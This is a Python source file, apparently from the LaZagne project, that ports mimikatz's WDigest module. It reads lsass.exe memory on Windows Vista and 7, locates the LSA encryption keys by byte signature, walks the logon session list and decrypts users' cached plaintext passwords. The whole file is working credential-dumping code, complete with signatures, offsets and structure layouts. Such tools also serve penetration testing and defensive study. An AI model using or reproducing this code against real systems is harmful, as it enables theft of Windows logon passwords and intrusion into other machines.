# -*- coding: utf-8 -*- 
# Code adapted from the awesome work done by Francesco Picasso
# Special thanks to: 
# Francesco Picasso for his mimikatz plugin: https://github.com/RealityNet/hotoloti/blob/master/volatility/mimikatz.py
# n1nj4sec for his memorpy lib: https://github.com/n1nj4sec/memorpy/

# Should work on Vista / Windows 7 (x86 and X64)
# Tested on Windows 7 (x86, x64)

from lazagne.config.crypto.pyaes.aes import AESModeOfOperationCBC
from lazagne.config.write_output import print_debug
from lazagne.config.crypto.pyDes import *
from construct import *
from memorpy import *
import struct

import os


# ===============================================================================
# 						Manage Credentials Found
# ===============================================================================

class Credential():
    """
    Store one credential found
    """

    def __init__(self, module='', username='', domain='', epwd='', pwd=''):
        self.module = module
        self.username = username
        self.domain = domain
        self.epwd = epwd
        self.pwd = pwd
        self.signature = module + username + domain + epwd.encode('hex')

    def decrypt_epwd(self, decryptor):
        if self.epwd and decryptor:
            self.pwd = decryptor.decrypt(self.epwd)
            try:
                self.pwd = self.pwd.decode('utf-16-le').rstrip('\0')
            except UnicodeDecodeError:
                print_debug('DEBUG', '[Credential:decrypt_epwd] unicode decode error')
                self.pwd = self.pwd.encode('hex')


class Credentials():
    """
    Store all credentials into a table
    """

    def __init__(self):
        self.credentials = []

    def add_credential(self, credential):
        already_in = False
        for cred in self.credentials:
            if cred.signature == credential.signature:
                already_in = True
        if not already_in:
            self.credentials.append(credential)


# ===============================================================================
# 							Mimikatz Structures
# ===============================================================================

class MimikatzBase(object):
    """
    The mimikatz base class, used to defined common attributes/methods.
    """
    SIZEOF_LONG = 4
    SIZEOF_PTR = None
    UNPACK_PTR = None
    UNPACK_LONG = '<L'

    def __init__(self, mw):
        self.mw = mw

    def get_ptr(self, pos):
        address = self.mw.Address(pos)
        return address.read(maxlen=self.SIZEOF_PTR)

    def get_data(self, pos, size):
        if pos and size:
            address = self.mw.Address(pos)
            return address.read(type='bytes', maxlen=size)
        return ''


class Mimikatz_x86(MimikatzBase):
    """
    The mimikatz x86 base class.
    """
    SIZEOF_PTR = 4
    UNPACK_PTR = '<L'

    def __init__(self, mw):
        MimikatzBase.__init__(self, mw)

    def get_ptr_with_offset(self, pos):
        return self.get_ptr(pos)


class Mimikatz_x64(MimikatzBase):
    """
    The mimikatz x64 base class.
    """
    SIZEOF_PTR = 8
    UNPACK_PTR = '<Q'

    def __init__(self, mw):
        MimikatzBase.__init__(self, mw)

    def get_ptr_with_offset(self, pos):
        address = self.mw.Address(pos)
        raw_data = address.read(type='bytes', maxlen=self.SIZEOF_LONG)
        if raw_data:
            ptr = struct.unpack(self.UNPACK_LONG, raw_data)[0]
            return pos + self.SIZEOF_LONG + ptr


# ===============================================================================
# 							LSA Decryptor Classes
# ===============================================================================

class LsaDecryptor():
    """
    Base LSA Decryptor class - Find specific signature depending on the system
    LSA Signatures are visible on mimikatz code: modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
    If sigature is found - iv, aes and des keys are retrieved to decrypt the password in cleartext
    """
    SIGNATURE = None
    IV_LENGTH = 16
    PTR_IV_OFFSET = None
    PTR_AES_KEY_OFFSET = None
    PTR_DES_KEY_OFFSET = None
    UUUR_TAG = 0x55555552
    MSSK_TAG = 0x4d53534b

    HARD_KEY = Struct(
        'cbSecret' / Int32ul,
        'data' / Bytes(this.cbSecret)
    )

    # Modified to include HARD_KEY size.
    BCRYPT_KEY = Struct(
        'size' / Int32ul,
        'tag' / Int32ul,  # 'MSSK'.
        'type' / Int32ul,
        'unk0' / Int32ul,
        'unk1' / Int32ul,
        'unk2' / Int32ul,
        'cbSecret' / Int32ul
    )

    def __init__(self):
        self.iv = ''
        self.aes_key = ''
        self.des_key = ''

    def find_signature(self):
        signature_offset = [x for x in self.mw.mem_search(self.SIGNATURE, protec=False)]
        if signature_offset:
            return signature_offset[0].value

    def get_IV(self, pos):
        ptr_iv = self.get_ptr_with_offset(pos + self.PTR_IV_OFFSET)
        if ptr_iv:
            return self.get_data(ptr_iv, self.IV_LENGTH)

    def get_key(self, pos, key_offset):
        ptr_key = self.get_ptr_with_offset(pos + key_offset)
        if ptr_key:
            ptr_key = self.get_ptr(ptr_key)
            if ptr_key:
                size = self.BCRYPT_HANDLE_KEY.sizeof()
                data = self.get_data(ptr_key, size)
                if data:
                    kbhk = self.BCRYPT_HANDLE_KEY.parse(data)
                    if kbhk.tag == self.UUUR_TAG:
                        ptr_key = kbhk.ptr_kiwi_bcrypt_key
                        size = self.BCRYPT_KEY.sizeof()
                        data = self.get_data(ptr_key, size)
                        if data:
                            kbk = self.BCRYPT_KEY.parse(data)
                            if kbk.tag == self.MSSK_TAG:
                                adjust = 4
                                size = kbk.cbSecret + adjust
                                ptr_key = ptr_key + self.BCRYPT_KEY.sizeof() - adjust
                                data = self.get_data(ptr_key, size)
                                if data:
                                    khk = self.HARD_KEY.parse(data)
                                    return khk.data
                                else:
                                    print_debug('DEBUG', 'get_key() unable to get HARD_KEY.')
                            else:
                                print_debug('DEBUG', 'get_key() BCRYPT_KEY invalid tag')
                        else:
                            print_debug('DEBUG', 'get_key() unable to read BCRYPT_KEY data.')
                    else:
                        print_debug('DEBUG', 'get_key() BCRYPT_HANDLE_KEY invalid tag')
                else:
                    print_debug('DEBUG', 'get_key() unable to read BCRYPT_HANDLE_KEY data.')
            else:
                print_debug('DEBUG', 'get_key() unable to get BCRYPT_HANDLE_KEY pointer.')
        else:
            print_debug('DEBUG', 'get_key()unable to get first pointer.')

    def get_des_key(self, pos):
        return self.get_key(pos, self.PTR_DES_KEY_OFFSET)

    def get_aes_key(self, pos):
        return self.get_key(pos, self.PTR_AES_KEY_OFFSET)

    def acquire_crypto_material(self):
        sigpos = self.find_signature()
        if not sigpos:
            print_debug('DEBUG', 'Lsa signature not found')
            return
        print_debug('DEBUG',
                    'Lsa signature {signature} found at offset {offset}'.format(signature=self.SIGNATURE.encode('hex'),
                                                                                offset=sigpos))

        self.iv = self.get_IV(sigpos)
        self.des_key = self.get_des_key(sigpos)
        self.aes_key = self.get_aes_key(sigpos)

    def decrypt(self, encrypted):
        # TODO: NT version specific, move from here in subclasses.
        cleartext = ''
        size = len(encrypted)
        if size:
            if size % 8:
                if not self.aes_key or not self.iv:
                    return cleartext
                cipher = AESModeOfOperationCBC(self.aes_key, iv=self.iv)
            else:
                if not self.des_key or not self.iv:
                    return cleartext
                cipher = triple_des(self.des_key, CBC, self.iv[:8])
            cleartext = cipher.decrypt(encrypted)
        return cleartext

    def dump(self):
        print_debug('DEBUG', 'Dumping LSA Decryptor')
        print_debug('DEBUG', '     IV ({}): {}'.format(len(self.iv), self.iv.encode('hex')))
        print_debug('DEBUG', 'DES_KEY ({}): {}'.format(len(self.des_key), self.des_key.encode('hex')))
        print_debug('DEBUG', 'AES_KEY ({}): {}'.format(len(self.aes_key), self.aes_key.encode('hex')))


class LsaDecryptor_x86(LsaDecryptor, Mimikatz_x86):
    """
    Base LSA Decryptor class for all x86 arch
    """
    BCRYPT_HANDLE_KEY = Struct(
        'size' / Int32ul,
        'tag' / Int32ul,  # Tag 'UUUR', 0x55555552.
        'ptr_void_algorithm' / Int32ul,
        'ptr_kiwi_bcrypt_key' / Int32ul,
        'ptr_unknown' / Int32ul
    )

    def __init__(self, mw):
        Mimikatz_x86.__init__(self, mw)
        LsaDecryptor.__init__(self)


class LsaDecryptor_x64(LsaDecryptor, Mimikatz_x64):
    """
    Base LSA Decryptor class for all x64 arch
    """
    BCRYPT_HANDLE_KEY = Struct(
        'size' / Int32ul,
        'tag' / Int32ul,  # Tag 'UUUR', 0x55555552.
        'ptr_void_algorithm' / Int64ul,
        'ptr_kiwi_bcrypt_key' / Int64ul,
        'ptr_unknown' / Int64ul
    )

    def __init__(self, mw):
        Mimikatz_x64.__init__(self, mw)
        LsaDecryptor.__init__(self)


class LsaDecryptor_Vista_x86(LsaDecryptor_x86):
    """
    Class for Windows Vista x86.
    """
    # MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]
    SIGNATURE = '\x8b\xf0\x3b\xf3\x7c\x2c\x6a\x02\x6a\x10\x68'
    PTR_IV_OFFSET = 11
    PTR_DES_KEY_OFFSET = -70
    PTR_AES_KEY_OFFSET = -15

    def __init__(self, mw):
        LsaDecryptor_x86.__init__(self, mw)


class LsaDecryptor_Win7_x86(LsaDecryptor_x86):
    """
    Class for Windows 7 x86.
    """
    # MIMIKATZ x86: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]
    SIGNATURE = '\x8b\xf0\x3b\xf3\x7c\x2c\x6a\x02\x6a\x10\x68'
    PTR_IV_OFFSET = 11
    PTR_DES_KEY_OFFSET = -70
    PTR_AES_KEY_OFFSET = -15

    def __init__(self, mw):
        LsaDecryptor_x86.__init__(self, mw)


class LsaDecryptor_Vista_x64(LsaDecryptor_x64):
    """
    Class for Vista x64.
    """
    SIGNATURE = '\x83\x64\x24\x30\x00\x44\x8b\x4c\x24\x48\x48\x8b\x0d'
    PTR_IV_OFFSET = 63
    PTR_DES_KEY_OFFSET = -69
    PTR_AES_KEY_OFFSET = 25

    def __init__(self, mw):
        LsaDecryptor_x64.__init__(self, mw)


class LsaDecryptor_Win7_x64(LsaDecryptor_x64):
    """
    Class for Windows 7 x64.
    """
    # MIMIKATZ x64: BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]
    SIGNATURE = '\x83\x64\x24\x30\x00\x44\x8b\x4c\x24\x48\x48\x8b\x0d'
    PTR_IV_OFFSET = 59
    PTR_DES_KEY_OFFSET = -61
    PTR_AES_KEY_OFFSET = 25

    def __init__(self, mw):
        LsaDecryptor_x64.__init__(self, mw)


# ===============================================================================
#	 							WDigest Classes
# ===============================================================================

class Wdigest():
    """
    Base Wdigest class - Find specific signature depending on the system
    If sigature is found - username, domain and encrypted password are retrieved
    """
    SIGNATURE = None
    FIRST_ENTRY_OFFSET = 0
    WDIGEST_LIST_ENTRY = None
    MODULE_NAME = 'wdigest'
    MAX_WALK = 32

    def __init__(self, credentials_obj):
        self.entries = []
        self.entries_seen = {}
        self.credentials_obj = credentials_obj

    def find_signature(self):
        """
        Returns a list of multiple address
        This signature could be found multiple times
        """
        signature_offset = [x for x in self.mw.mem_search(self.SIGNATURE, protec=False)]
        return signature_offset

    def get_entry_at(self, ptr):
        if ptr:
            size = self.WDIGEST_LIST_ENTRY.sizeof()
            data = self.get_data(ptr, size)
            if data:
                entry = self.WDIGEST_LIST_ENTRY.parse(data)
                return entry

    def get_first_entry(self, position):
        try:
            ptr_entry = self.get_ptr_with_offset(position + self.FIRST_ENTRY_OFFSET)
            if ptr_entry:
                ptr_entry = self.get_ptr(ptr_entry)
                if ptr_entry:
                    entry = self.get_entry_at(ptr_entry)
                    if entry:
                        return entry, ptr_entry
        except Exception:
            pass

        return None, None

    def get_unicode_string_at(self, ptr, size):
        data = self.get_data(ptr, size)
        if data:
            data_str = ''
            try:
                data_str = data.decode('utf-16-le').rstrip('\0')
            except UnicodeDecodeError as ee:
                print_debug('DEBUG', '[Wdigest] Get_unicode_string_at() unicode error {}'.format(ee))
            return data_str
        else:
            print_debug('DEBUG', '[Wdigest] Get_unicode_string_at() unable to get data')
            return ''

    def add_entry(self, entry, found_at):
        if entry.usage_count:
            if entry.this_entry == found_at:
                user = domain = epwd = ''
                if entry.user_string_ptr and entry.user_len:
                    user = self.get_unicode_string_at(entry.user_string_ptr, entry.user_max_len)
                if entry.domain_string_ptr and entry.domain_len:
                    domain = self.get_unicode_string_at(entry.domain_string_ptr, entry.domain_max_len)
                if entry.password_encrypted_ptr and entry.password_len:
                    epwd = data = self.get_data(entry.password_encrypted_ptr, entry.password_max_len)

                if user:
                    cred_entry = Credential(self.MODULE_NAME, user, domain, epwd)
                    self.credentials_obj.add_credential(cred_entry)

    def walk_entries(self):
        positions = self.find_signature()
        for position in positions:
            entry, found_at = self.get_first_entry(position.value)
            if entry:
                walk_num = 1
                while walk_num < self.MAX_WALK:
                    self.add_entry(entry, found_at)
                    self.entries_seen[found_at] = 1
                    found_at = entry.previous
                    entry = self.get_entry_at(found_at)
                    if not entry:
                        print_debug('DEBUG', 'Next entry not found!')
                        break
                    if entry.this_entry in self.entries_seen:
                        break
                    walk_num += 1


class Wdigest_x86(Wdigest, Mimikatz_x86):
    """
    Base WDigest class for all x86 arch
    """
    WDIGEST_LIST_ENTRY = Struct(
        'previous' / Int32ul,
        'next' / Int32ul,
        'usage_count' / Int32ul,
        'this_entry' / Int32ul,
        'luid' / Int64ul,
        'flag' / Int64ul,
        'user_len' / Int16ul,
        'user_max_len' / Int16ul,
        'user_string_ptr' / Int32ul,
        'domain_len' / Int16ul,
        'domain_max_len' / Int16ul,
        'domain_string_ptr' / Int32ul,
        'password_len' / Int16ul,
        'password_max_len' / Int16ul,
        'password_encrypted_ptr' / Int32ul
    )

    def __init__(self, mw, credentials_obj):
        Mimikatz_x86.__init__(self, mw)
        Wdigest.__init__(self, credentials_obj)


class Wdigest_x64(Wdigest, Mimikatz_x64):
    """
    Base WDigest class for all x64 arch
    """
    WDIGEST_LIST_ENTRY = Struct(
        'previous' / Int64ul,
        'next' / Int64ul,
        'usage_count' / Int32ul,
        'align1' / Int32ul,
        'this_entry' / Int64ul,
        'luid' / Int64ul,
        'flag' / Int64ul,
        'user_len' / Int16ul,
        'user_max_len' / Int16ul,
        'align2' / Int32ul,
        'user_string_ptr' / Int64ul,
        'domain_len' / Int16ul,
        'domain_max_len' / Int16ul,
        'align3' / Int32ul,
        'domain_string_ptr' / Int64ul,
        'password_len' / Int16ul,
        'password_max_len' / Int16ul,
        'align4' / Int32ul,
        'password_encrypted_ptr' / Int64ul
    )

    def __init__(self, mw, credentials_obj):
        Mimikatz_x64.__init__(self, mw)
        Wdigest.__init__(self, credentials_obj)


class Wdigest_Vista_x86(Wdigest_x86):
    """
    Class for Windows Vista x86.
    """
    SIGNATURE = '\x74\x11\x8b\x0b\x39\x4e\x10'
    FIRST_ENTRY_OFFSET = -6

    def __init__(self, mw, credentials_obj):
        Wdigest_x86.__init__(self, mw, credentials_obj)


class Wdigest_Win7_x86(Wdigest_x86):
    """
    Class for Windows 7 x86.
    """
    SIGNATURE = '\x74\x11\x8b\x0b\x39\x4e\x10'
    FIRST_ENTRY_OFFSET = -6

    def __init__(self, mw, credentials_obj):
        Wdigest_x86.__init__(self, mw, credentials_obj)


class Wdigest_Win7_x64(Wdigest_x64):
    """
    Class for Windows 7 x64.
    """
    SIGNATURE = '\x48\x3b\xd9\x74'
    FIRST_ENTRY_OFFSET = -4

    def __init__(self, mw, credentials_obj):
        Wdigest_x64.__init__(self, mw, credentials_obj)


class Wdigest_Vista_x64(Wdigest_x64):
    """
    Class for Windows Vista x64.
    """
    SIGNATURE = '\x48\x3b\xd9\x74'
    FIRST_ENTRY_OFFSET = -4

    def __init__(self, mw, credentials_obj):
        Wdigest_x64.__init__(self, mw, credentials_obj)


# ===============================================================================
# 						Mimikatz - Main Class
# ===============================================================================

class Mimikatz():
    """
    Prerequisites: Need Admin privilege and debug privilege has to be set.
    Otherwise, lsass.exe memory cannot be read
    """

    def __init__(self, os, arch):
        self.os = os
        self.arch = arch
        self.credentials_obj = Credentials()

    def init_objects(self, mw):
        lsa_decryptor = None
        wdigest = None

        if self.os == 'Vista':
            if self.arch == 'x86':
                lsa_decryptor = LsaDecryptor_Vista_x86(mw)
                wdigest = Wdigest_Vista_x86(mw, self.credentials_obj)

            elif self.arch == 'x64':
                lsa_decryptor = LsaDecryptor_Vista_x64(mw)
                wdigest = Wdigest_Vista_x64(mw, self.credentials_obj)

        elif self.os == 'Win7':
            if self.arch == 'x86':
                lsa_decryptor = LsaDecryptor_Win7_x86(mw)
                wdigest = Wdigest_Win7_x86(mw, self.credentials_obj)
            elif self.arch == 'x64':
                lsa_decryptor = LsaDecryptor_Win7_x64(mw)
                wdigest = Wdigest_Win7_x64(mw, self.credentials_obj)
        return lsa_decryptor, wdigest

    def find_wdigest_password(self, debug=False):
        """
        Main function to run to decrypt wdigest password.
        Prerequisites: Need Admin privilege and debug privilege has to be set.
        """
        mw = MemWorker(name='lsass.exe')
        if mw:
            lsa_decryptor, wdigest = self.init_objects(mw)
            if not lsa_decryptor or not wdigest:
                return

            lsa_decryptor.acquire_crypto_material()
            if debug:
                lsa_decryptor.dump()

            wdigest.walk_entries()

            for cred in self.credentials_obj.credentials:
                cred.decrypt_epwd(lsa_decryptor)

            passwords = []
            for cred in self.credentials_obj.credentials:
                passwords.append(
                    {
                        'Domain': cred.domain,
                        'Login': cred.username,
                        'Password': cred.pwd,
                    }
                )

            return passwords


if __name__ == '__main__':
    # Need Admin privilege and debug privilege has to be set.
    m = Mimikatz(os='Win7', arch='x86')
    print
    m.find_wdigest_password()
